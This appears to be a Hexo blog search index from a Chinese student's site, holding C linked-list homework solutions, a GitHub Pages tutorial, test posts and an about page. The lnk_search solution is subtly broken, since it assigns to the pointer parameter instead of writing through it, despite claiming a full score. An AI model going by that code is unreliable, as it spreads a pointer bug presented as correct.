class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-03-13, Fri, 18:35:51</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void lnk_del_x2y(LinkList L, ElemType mink, ElemType maxk)</span><br><span class="line">&#123;</span><br><span class="line">    LinkList p, q, prev &#x3D; NULL;</span><br><span class="line">    if (mink &gt; maxk)</span><br><span class="line">        return;</span><br><span class="line">    p &#x3D; L;</span><br><span class="line">    prev &#x3D; p;</span><br><span class="line">    p &#x3D; p-&gt;next;</span><br><span class="line">    while (p &amp;&amp; p-&gt;data &lt; maxk) &#123;</span><br><span class="line">        if (p-&gt;data &lt;&#x3D; mink) &#123;</span><br><span class="line">            prev &#x3D; p;</span><br><span class="line">            p &#x3D; p-&gt;next;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            prev-&gt;next &#x3D; p-&gt;next;</span><br><span class="line">            q &#x3D; p;</span><br><span class="line">            p &#x3D; p-&gt;next;</span><br><span class="line">            free(q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T5"><a href="#T5" class="headerlink" title="T5"></a>T5</h1><ol><li><p>链表 倒数查找<br>已知一个带有表头结点的单链表, 假设链表只给出了头指针L。在不改变链表的前提下，请设计一个尽可能高效的算法，查找链表中倒数第k个位置上的结点（k为正整数）。<br>函数原型为：</p><blockquote><p>int lnk_search(LinkList L, int k, ElemType* p_ele)<br>若查找成功，函数通过指针参数 p_ele 返回该结点 data 域的值，此时函数返回 1；否则，函数返回 0。相关定义如下：<br>struct _lnklist{</p><pre><code>ElemType data;struct _lnklist *next;</code></pre><p>};<br>typedef struct _lnklist Node;<br>typedef struct _lnklist *LinkList;</p></blockquote></li><li><p>解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-03-13, Fri, 18:40:21</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int lnk_search(LinkList L, int k, ElemType* p_ele)</span><br><span class="line">&#123;</span><br><span class="line">    LinkList p &#x3D; L-&gt;next, q &#x3D; L-&gt;next;</span><br><span class="line">    int count &#x3D; 0;</span><br><span class="line">    while (p !&#x3D; NULL) &#123;</span><br><span class="line">        if (count &lt; k)</span><br><span class="line">            count++;</span><br><span class="line">        else</span><br><span class="line">            q &#x3D; q-&gt;next;</span><br><span class="line">        p &#x3D; p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    if (count &lt; k)</span><br><span class="line">        return 0;</span><br><span class="line">    else &#123;</span><br><span class="line">        p_ele &#x3D; q-&gt;data;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T6"><a href="#T6" class="headerlink" title="T6"></a>T6</h1><ol><li><p>链表 合并<br>设线性表A=(a1, a2,…,am)，B=(b1, b2,…,bn)，试写一个按下列规则合并A、B为线性表C的算法，使得：<br>C= (a1, b1,…,am, bm, bm+1, …,bn) 当m≤n时；<br>或者<br>C= (a1, b1,…,an, bn, an+1, …,am) 当m&gt;n时。<br>线性表A、B、C均以单链表作为存储结构，且C表利用A表和B表中的结点空间构成。注意：单链表的长度值m和n均未显式存储。<br>函数的原型如下：</p><blockquote><p>void lnk_merge(LinkList A, LinkList B, LinkList C)<br>即将A和B合并为C，其中 C 已经被初始化为空单链表<br>相关定义如下：<br>struct _lnklist{</p><pre><code>ElemType data;struct _lnklist *next;</code></pre><p>};<br>typedef struct _lnklist Node;<br>typedef struct _lnklist *LinkList;</p></blockquote></li><li><p>解析</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-03-21, Sat, 12:38:40</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;list.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void lnk_merge(LinkList A, LinkList B, LinkList C)</span><br><span class="line">&#123;</span><br><span class="line">    Node *p, *q, *m, *temp;</span><br><span class="line">    p &#x3D; A-&gt;next;</span><br><span class="line">    q &#x3D; B-&gt;next;</span><br><span class="line">    m &#x3D; C;</span><br><span class="line">    while (p !&#x3D; NULL &amp;&amp; q !&#x3D; NULL) &#123;</span><br><span class="line">        m-&gt;next &#x3D; p;</span><br><span class="line">        temp &#x3D; p-&gt;next;</span><br><span class="line">        p-&gt;next &#x3D; q;</span><br><span class="line">        m &#x3D; q;</span><br><span class="line">        p &#x3D; temp;</span><br><span class="line">        q &#x3D; q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    if (p !&#x3D; NULL) &#123;</span><br><span class="line">        m-&gt;next &#x3D; p;</span><br><span class="line">    &#125;</span><br><span class="line">    if (q !&#x3D; NULL) &#123;</span><br><span class="line">        m-&gt;next &#x3D; q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 线性表 </tag>
            
            <tag> 链表 </tag>
            
            <tag> 顺序表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用githubPages架构简单的静态网页</title>
      <link href="/post/34560.html"/>
      <url>/post/34560.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Github账号的注册"><a href="#Github账号的注册" class="headerlink" title="Github账号的注册"></a>Github账号的注册</h1><ol><li><p>首先在<a href="https://github.com" target="_blank" rel="noopener">GitHub</a>注册一个GitHub账号，并在你的Github Repositories下新建一个名为YourName.github.io的仓库。</p></li><li><p>所有选项按照默认配置就行。</p><blockquote><p>值得注意的是，GitHub平台是全英文的，因此具备一定的英语水平还是必要的</p></blockquote></li><li><p>其次，下载<a href="https://git-scm.com" target="_blank" rel="noopener">Git</a>并安装，所有选项按照默认配置即可</p><blockquote><p>Git的所有操作一般都在Gi bash控制台界面进行，因此学习掌握Git的使用是十分必要的</p></blockquote></li><li><p>打开Git Bash控制台，使用git config –global user.name指令生命本机用户名，之后使用git config –global user.email指令声明本机用户名对应的邮箱地址。再使用ssh-keygen -t rsa -C <a href="mailto:email@email.com">email@email.com</a>指令生成新的ssh公钥</p></li><li><p>使用cd指令选择一个合适的路径存放你的本地仓库，使用mkdir指令建立一个由你自由命名的文件夹。</p><blockquote><p>Linux指令： cd——用于切换所在目录<br>Linux指令: mkdir——用于新建文件/文件夹</p></blockquote></li><li><p>使用git init指令对本地仓库进行初始化。至此，你的一个本地仓库已经架构完成！</p><blockquote><p>Git指令： git init——用于在一个空的位置进行Git的初始化</p></blockquote></li></ol><hr><h1 id="本地仓库与Github-Repositories-建立连接"><a href="#本地仓库与Github-Repositories-建立连接" class="headerlink" title="本地仓库与Github Repositories 建立连接"></a>本地仓库与Github Repositories 建立连接</h1><ol><li>在GitHub的Settings中找到SSH and GPG keys并且选择New SSH key，找到你的电脑中.ssh文件夹中的公钥文件id_rsa.pub，并将其中的内容复制到网页相应位置，配置成功之后保存即可。</li><li>使用ssh -T <a href="mailto:git@github.com">git@github.com</a>测试连接是否成功<blockquote><p>Git指令： ssh -T <a href="mailto:git@github.com">git@github.com</a>——用于测试本地仓库与远程仓库之间是否成功连接</p></blockquote></li><li>连接测试成功之后找到网页上你的相应仓库，在Clone or Download中选择Clone with Https，复制URL。回到Git Bash控制台，使用git remote add origin [你刚刚复制的URL] 指令进行远程连接<blockquote><p>Git指令： git remote add origin [URL]——连接本地仓库到指定的远程库</p></blockquote></li><li>连接成功之后，你就可以将本地仓库的内容远程push到GitHub仓库中去了。<blockquote><p>Git指令： git push——将本地仓库的内容推送到远程库中</p><blockquote><p>Git push的一般步骤：</p><pre><code>1. git add .2. git status3. git commit -m &quot;备注内容&quot;4. git push</code></pre></blockquote></blockquote></li></ol><h1 id="启用Github-Pages功能"><a href="#启用Github-Pages功能" class="headerlink" title="启用Github Pages功能"></a>启用Github Pages功能</h1><ol><li>将你的仓库名称修改为YourName.github.io</li><li>在你的Repositories的Settings中找到GitHub Pages选项，将Source改为master branch后保存。</li></ol><h1 id="搭建一个静态网页"><a href="#搭建一个静态网页" class="headerlink" title="搭建一个静态网页"></a>搭建一个静态网页</h1><ol><li>一般的，我们从搭建静态网页开始。在本地仓库中建立index.html作为主界面文件。打开index.html</li><li>键入<p>Hello World!</p>并保存。</li><li>在你的本地仓库的文件夹内用鼠标右键单击Git Bash Here唤起Git Bash控制台，使用git add .指令将所有的文件提交到缓存区，使用git status命令查看文件状态，确认无误后，使用git commit -m “你想要留下的备注”提交更改，之后用git push命令将所有的更改上传到GitHub的远程仓库中。<blockquote><p>Git push的全套流程参见上文</p></blockquote></li><li>至此，一个最简单的静态网页就被成功搭建了。你可以通过YourName.github.io这个网址来访问你的个人网站。</li></ol><h1 id="将GitHub-Pages架构的网站解析到自己的域名"><a href="#将GitHub-Pages架构的网站解析到自己的域名" class="headerlink" title="将GitHub Pages架构的网站解析到自己的域名"></a>将GitHub Pages架构的网站解析到自己的域名</h1><ol><li>你需要购买一个域名的使用期限。本文以在腾讯云平台购买域名为例</li><li>在腾讯云官网上进行注册和实名认证，依靠后缀找到合适的域名，并且确认其是否可用。在付款之后即可使用。<blockquote><p>一个教训：选择域名后缀的时候不要贪图便宜或者过于追求新意。笔者的以.space为后缀的域名目前面临着无法进行公安备案的尴尬处境</p></blockquote></li><li>两种解析方式<ul><li>在腾讯域名管理界面选择解析，利用电脑自带的CMD或者PowerShell控制台，输入Ping YourName.github.io来确认IP地址，直接解析该IP地址，添加到解析记录中。</li><li>或者在解析时选择CNAME方式，在后面可以直接解析githubpages网址（就是YourName.github.io）</li></ul></li><li>解析记录添加成功之后即可直接从该域名访问个人网站。</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> Github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
            <tag> 静态网页 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test01</title>
      <link href="/post/63177.html"/>
      <url>/post/63177.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="这是一个测试页面"><a href="#这是一个测试页面" class="headerlink" title="这是一个测试页面"></a>这是一个测试页面</h1><h2 id="测试开始于2020-02-10"><a href="#测试开始于2020-02-10" class="headerlink" title="测试开始于2020-02-10"></a>测试开始于2020-02-10</h2><h3 id="正在测试多级标题的完整性"><a href="#正在测试多级标题的完整性" class="headerlink" title="正在测试多级标题的完整性"></a>正在测试多级标题的完整性</h3><h4 id="这是第四级标题"><a href="#这是第四级标题" class="headerlink" title="这是第四级标题"></a>这是第四级标题</h4><h5 id="这是第五级标题"><a href="#这是第五级标题" class="headerlink" title="这是第五级标题"></a>这是第五级标题</h5><h6 id="这是第六级标题"><a href="#这是第六级标题" class="headerlink" title="这是第六级标题"></a>这是第六级标题</h6><pre><code>测试</code></pre><p>1234567890<br>    测试</p><ul><li>测试01</li><li>测试02</li><li>测试03</li></ul><ol start="4"><li>测试04</li><li>测试05</li><li>测试06</li></ol><p>【外链文本测试】（<a href="http://www.xinhuanet.com//politics/2020-02/10/c_1125555826.htm）" target="_blank" rel="noopener">http://www.xinhuanet.com//politics/2020-02/10/c_1125555826.htm）</a></p><p>【外链图片测试】<br>！【avatar】（<a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/avatar.png）" target="_blank" rel="noopener">https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/avatar.png）</a></p><h1 id="引用测试"><a href="#引用测试" class="headerlink" title="引用测试"></a>引用测试</h1><blockquote><p>夕阳像一只狐狸悄悄穿过这片土地，转瞬间点燃荒草。——果戈里</p></blockquote><p><em>夕阳</em>像一只<strong>狐狸</strong>悄悄<em>穿过</em>这片<strong>土地</strong>，<code>转瞬间点燃荒草</code></p><h1 id="代码插入测试"><a href="#代码插入测试" class="headerlink" title="代码插入测试"></a>代码插入测试</h1><p><code>printf(&quot;Hello,World!&quot;);</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">include&lt;stdio.h&gt;</span><br><span class="line">include&lt;stdlib.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int a,b;</span><br><span class="line">    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span><br><span class="line">    printf(&quot;Sum &#x3D; %d&quot;,a+b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="表格插入测试"><a href="#表格插入测试" class="headerlink" title="表格插入测试"></a>表格插入测试</h1><table><thead><tr><th>Tables</th><th align="center">Are</th><th align="right">Cool</th></tr></thead><tbody><tr><td>col 3 is</td><td align="center">right-aligned</td><td align="right">$1600</td></tr><tr><td>col 2 is</td><td align="center">centered</td><td align="right">$12</td></tr><tr><td>zebra stripes</td><td align="center">are neat</td><td align="right">$1</td></tr></tbody></table><h1 id="图片测试2"><a href="#图片测试2" class="headerlink" title="图片测试2"></a>图片测试2</h1><p>![][1]<br>[1]:<a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BlueChip_ZH-CN7376022522_1920x1080.jpg" target="_blank" rel="noopener">https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BlueChip_ZH-CN7376022522_1920x1080.jpg</a></p><h1 id="初次测试结束"><a href="#初次测试结束" class="headerlink" title="初次测试结束"></a>初次测试结束</h1><h3 id="2020-02-10"><a href="#2020-02-10" class="headerlink" title="2020-02-10"></a>2020-02-10</h3>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/post/16107.html"/>
      <url>/post/16107.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>lab</title>
      <link href="/Lab/index.html"/>
      <url>/Lab/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">本页面用于实验各种未发布&#x2F;正式部署的插件&#x2F;应用程序&#x2F;架构等，不保证其鲁棒性！</span><br><span class="line">进入此页面请谨慎使用各项功能，以免造成包括但不限于死机，卡退等后果</span><br></pre></td></tr></table></figure></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于自己</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><ul><li>他是一个曾经高唱着“青霄有路终须到，金榜无名誓不归”的少年</li><li>他热爱生活，热爱周遭的一切，想要亲自去探索他所存在的的世界</li><li>他热爱计算机，热爱编程。与代码相处让他感到由衷的快乐</li><li>“须知少时凌云志，曾许人间第一流”</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Name: Cosmos</span><br><span class="line">Age: 20</span><br><span class="line">Gender: male</span><br><span class="line">Address: ChengDu</span><br><span class="line">Github: https:&#x2F;&#x2F;github.com&#x2F;cosmos-UESTC</span><br><span class="line">Blog: https:&#x2F;&#x2F;fengxinyue.cn&#x2F;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">“疏影横斜水清浅，暗香浮动月黄昏”</span><br><span class="line"></span><br><span class="line">于2020-02-10 夜</span><br></pre></td></tr></table></figure></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>live2d</title>
      <link href="/live2d/index.html"/>
      <url>/live2d/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本版面用于测试开发中的Live2d模组在Butterfly主题中的应用，目前没有具体的实验方法以及具体步骤</span><br><span class="line">故无法保证实验的有效性和系统的鲁棒性！</span><br></pre></td></tr></table></figure></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/Lab/index.html"/>
      <url>/Lab/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><!DOCTYPE html><html lang="zh-CN"><head>    <meta charset="utf-8">    <meta name="viewport" content="width=device-width">    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    <meta name="renderer" content="webkit">    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">    <title>Love Timer</title>    <style>        body {            -webkit-font-smoothing: antialiased;            font-family: Helvetica Neue, Helvetica, Hiragino Sans GB, Microsoft YaHei, Arial, sans-serif;            background-image: url('bg.jpg');            font-size: 85%;            margin: 0;        }                h2 {            font-size: 500%;            font-weight: 500;        }                .content {            position: absolute;            width: 100%;            top: 40%;            transform: translate(0, -50%);            text-align: center;        }                .timer {            font-size: 220%;            line-height: 1.5;            margin: 1em 0;        }                .timer b {            color: rgb(253, 99, 125);        }    </style><meta name="generator" content="Hexo 4.2.0"></head><body>    <div class="content">        <h2>We have been together for</h2>        <div class="timer">            <b id="d"></b> Days <b id="h"></b> Hours <b id="m"></b> Minutes <b id="s"></b> Seconds        </div>    </div>    <script>        function timer() {            var start = new Date(2020, 11, 11); // 20**·??·??，姑且先用今年的双11吧            //写给未来的我：            //玩意那天就用上了呢            var t = new Date() - start;            var h = ~~(t / 1000 / 60 / 60 % 24);            if (h < 10) {                h = "0" + h;            }            var m = ~~(t / 1000 / 60 % 60);            if (m < 10) {                m = "0" + m;            }            var s = ~~(t / 1000 % 60);            if (s < 10) {                s = "0" + s;            }            document.getElementById('d').innerHTML = ~~(t / 1000 / 60 / 60 / 24);            document.getElementById('h').innerHTML = h;            document.getElementById('m').innerHTML = m;            document.getElementById('s').innerHTML = s;        }        timer();        setInterval(timer, 1000);    </script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":250},"mobile":{"show":true},"react":{"opacity":1},"log":false});</script></body></html>]]></content>
      
    </entry>
    
    
  
</search>
